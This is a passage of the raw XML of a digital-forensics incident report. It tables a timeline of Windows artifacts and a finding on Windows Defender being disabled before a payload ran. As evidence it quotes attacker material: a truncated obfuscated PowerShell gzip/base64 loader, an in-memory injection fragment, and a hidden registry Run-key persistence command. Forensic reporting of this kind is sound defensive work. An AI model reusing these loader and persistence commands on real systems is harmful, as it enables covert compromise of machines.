              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2020-09-19 05:08:44.088879</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&amp;amp;([scriptblock]::create((New-Object System.IO.StreamReader(New-Object System.IO.Compression.GzipStream((New-Object System.IO.MemoryStream(,[System.Convert]::FromBase64String('H4sIAHNwZV8CA7VWe2+bSBD/O5HyHVB</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>evtxecmd/evtxecmd_0.csv#15080</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>F:\Windows\System32\winevt\logs\Microsoft-Windows-PowerShell%4Operational.evtx</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2020-09-19 05:08:44.732435</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Event logs (EVTX)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3628"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>EVTX event</w:t>
              <w:br/>
              <w:t>Microsoft-Windows-PowerShell/Operational 4104 | Microsoft-Windows-PowerShell | Contains contents of scripts run | Path:  | ScriptBlockText: function pLBA {, Param ($kuL, $fc), $wk = ([AppDomain]::CurrentDomain.GetAssemblies() | Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals('System.dll') }).GetType('Microsoft.Win32.Un</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>evtxecmd/evtxecmd_0.csv#15081</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>F:\Windows\System32\winevt\logs\Microsoft-Windows-PowerShell%4Operational.evtx</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2020-09-19 05:08:37.656394</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Prefetch</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3628"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Execution (Prefetch, previous)</w:t>
              <w:br/>
              <w:t>POWERSHELL.EXE</w:t>
              <w:br/>
              <w:t>runs=2 hash=CA1AE517 False</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>pecmd/prefetch_0.csv#92</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>F:\Windows\prefetch\POWERSHELL.EXE-CA1AE517.pf</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2020-09-19 05:08:37</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Memory: process scan (psscan)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3628"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>process created (memory, psscan)</w:t>
              <w:br/>
              <w:t>powershell.exe</w:t>
              <w:br/>
              <w:t>PID=508 | PPID=1380 | ImageFileName=powershell.exe | SessionId=2</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>volatility/windows.psscan.PsScan.jsonl#101</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>C:\Sleuthline\cases\test04\memory\DESKTOP-SDN1RPT.mem</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2020-09-19 05:08:43</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Memory: process scan (psscan)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3628"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>process created (memory, psscan)</w:t>
              <w:br/>
              <w:t>powershell.exe</w:t>
              <w:br/>
              <w:t>PID=3316 | PPID=508 | ImageFileName=powershell.exe | SessionId=2</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>volatility/windows.psscan.PsScan.jsonl#13</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>C:\Sleuthline\cases\test04\memory\DESKTOP-SDN1RPT.mem</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suricata/case001.pcap/eve_flow.jsonl#16628</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>case001.pcap</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2020-09-19 04:08:45.783080</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10.42.85.115:50972 | A Network Trojan was detected | 1:shvkq1T5rI2BCKSFPByeBaHUCDE= | case001.pcap</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>suricata/case001.pcap/eve_alert.jsonl#455</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>case001.pcap</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volatility/windows.netscan.NetScan.jsonl#114</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2020-09-19 03:44:03.540241</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Run keys</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3628"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>run: ts</w:t>
              <w:br/>
              <w:t>Microsoft\Windows\CurrentVersion\Run</w:t>
              <w:br/>
              <w:t>name=coreupdate | command={"executable":"%COMSPEC%","args":["/b /c start /b /min powershell -nop -w hidden -c \"sleep 0; iex([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String((Get-Item 'HKLM:Software\\q9Z1bssi').GetValue('JqxNhWJA'))))\""]}</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>dissect/runkeys.jsonl#5</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>sysvol/windows/system32/config/SOFTWARE</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>F-007: Defense evasion: Windows Defender real-time protection, MAPS reporting and sample submission disabled during the RDP session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(recmd kroll)</w:t>
              <w:br/>
              <w:t>artifact:windows timeline (activitiescache)</w:t>
              <w:br/>
              <w:t>evtx:microsoft-windows-windows defender%4operational.evtx</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2551"/>
            <w:shd w:val="clear" w:color="auto" w:fill="D9E2F3"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>Category</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="7087"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>defense evasion</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2551"/>
            <w:shd w:val="clear" w:color="auto" w:fill="D9E2F3"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>MITRE ATT&amp;CK</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="7087"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>T1562.001</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2551"/>
            <w:shd w:val="clear" w:color="auto" w:fill="D9E2F3"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>Period (UTC)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="7087"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>2020-09-18 22:52:57.112379 → 2020-09-19 03:39:49.843705</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Observed facts</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>Microsoft-Windows-Windows Defender/Operational: EID 5001 RecordID 36 at 2020-09-19 03:39:45.248 UTC (Real-time protection disabled, product 4.18.2009.2); EID 5007 RecordID 37 at 03:39:46.680 SpyNet\SpyNetReporting 0x2 -&gt; 0x0; RecordID 38 at 03:39:47.699 SpyNet\SubmitSamplesConsent 0x1 -&gt; 0x0; RecordID 39 at 03:39:49.844 Features\TamperProtection 0x1 -&gt; 0x4. SOFTWARE hive: HKLM\SOFTWARE\Microsoft\Windows Defender\Real-Time Protection\DisableRealtimeMonitoring = 1, key LastWrite 2020-09-19 03:39:44.302. No Defender detection events (1116/1117) exist in the log; MPLog has no entries after 03:30.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Analysis</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>True positive (Hayabusa/Chainsaw/Zircolite 'Windows Defender Real-time Protection Disabled'). Occurs inside the C137\Administrator RDP session (3 min after logon) and 11 s before coreupdater.exe is written to disk: a deliberate disabling (most likely via the Windows Security GUI, TamperProtection value 0x4 = off-by-user) to allow the payload to run. Consequence: absence of Defender detections afterwards is not evidence that the payloads are benign.</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03:39:45.247925</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Event logs (EVTX)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3628"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>EVTX event</w:t>
              <w:br/>
              <w:t>Microsoft-Windows-Windows Defender/Operational 5001 | Microsoft-Windows-Windows Defender | Real-time Protection was disabled | %%827</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>evtxecmd/evtxecmd_0.csv#35493</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>F:\Windows\System32\winevt\logs\Microsoft-Windows-Windows Defender%4Operational.evtx</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2020-09-19 03:39:46.680210</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Defender\SpyNet\SpyNetReporting = 0x2 | New Value: HKLM\SOFTWARE\Microsoft\Windows Defender\SpyNet\SpyNetReporting = 0x0</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>evtxecmd/evtxecmd_0.csv#35494</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>F:\Windows\System32\winevt\logs\Microsoft-Windows-Windows Defender%4Operational.evtx</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2020-09-19 03:39:47.699207</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Defender\SpyNet\SubmitSamplesConsent = 0x1 | New Value: HKLM\SOFTWARE\Microsoft\Windows Defender\SpyNet\SubmitSamplesConsent = 0x0</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>evtxecmd/evtxecmd_0.csv#35495</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>F:\Windows\System32\winevt\logs\Microsoft-Windows-Windows Defender%4Operational.evtx</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2020-09-19 03:39:49.843705</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Defender\Features\TamperProtection = 0x1 | New Value: HKLM\SOFTWARE\Microsoft\Windows Defender\Features\TamperProtection = 0x4</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>evtxecmd/evtxecmd_0.csv#35496</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>F:\Windows\System32\winevt\logs\Microsoft-Windows-Windows Defender%4Operational.evtx</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2020-09-19 03:39:44.301917</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Registry (RECmd Kroll)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3628"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Registry: key last written</w:t>
              <w:br/>
              <w:t>ROOT\Microsoft\Windows Defender\Real-Time Protection</w:t>
              <w:br/>
              <w:t>Threat Hunting | Windows Defender | DisableRealtimeMonitoring=1</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>recmd_kroll/recmd_kroll_F.csv#8622</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>F:\Windows\System32\config\SOFTWARE</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2020-09-19 03:39:45.247000</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Detection Hayabusa</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3628"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>high</w:t>
              <w:br/>
              <w:t>Windows Defender Real-time Protection Disabled | {"Product Name":"%%827","Product Version":"4.18.2009.2"} | {}</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>hayabusa/hayabusa_0.jsonl#782</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>F:\Windows\System32\winevt\logs\Microsoft-Windows-Windows Defender%4Operational.evtx</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2020-09-19 03:39:38</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Windows Timeline (ActivitiesCache)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3628"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Activity: start ; Activity: last modified</w:t>
              <w:br/>
              <w:t>Microsoft.Windows.SecHealthUI_cw5n1h2txyewy!SecHealthUI</w:t>
              <w:br/>
              <w:t>Windows Security type=ExecuteOpen</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>wxtcmd/F/Users/Administrator/AppData/Local/ConnectedDevicesPlatform/L.Administrator/20261025201827_Administrator_Activity.csv#9</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>F:\Users\Administrator\AppData\Local\ConnectedDevicesPlatform\L.Administrator\ActivitiesCache.db</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2020-09-19 03:39:38</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Windows Timeline (ActivitiesCache)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3628"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Activity: start</w:t>
              <w:br/>
              <w:t>Microsoft.Windows.SecHealthUI_cw5n1h2txyewy!SecHealthUI</w:t>
              <w:br/>
              <w:t>type=InFocus duration=00:00:16</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>wxtcmd/F/Users/Administrator/AppData/Local/ConnectedDevicesPlatform/L.Administrator/20261025201827_Administrator_Activity.csv#10</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>F:\Users\Administrator\AppData\Local\ConnectedDevicesPlatform\L.Administrator\ActivitiesCache.db</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2020-09-19 03:39:47.785620</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Registry (RECmd Kroll)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3628"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Registry: key last written</w:t>
              <w:br/>
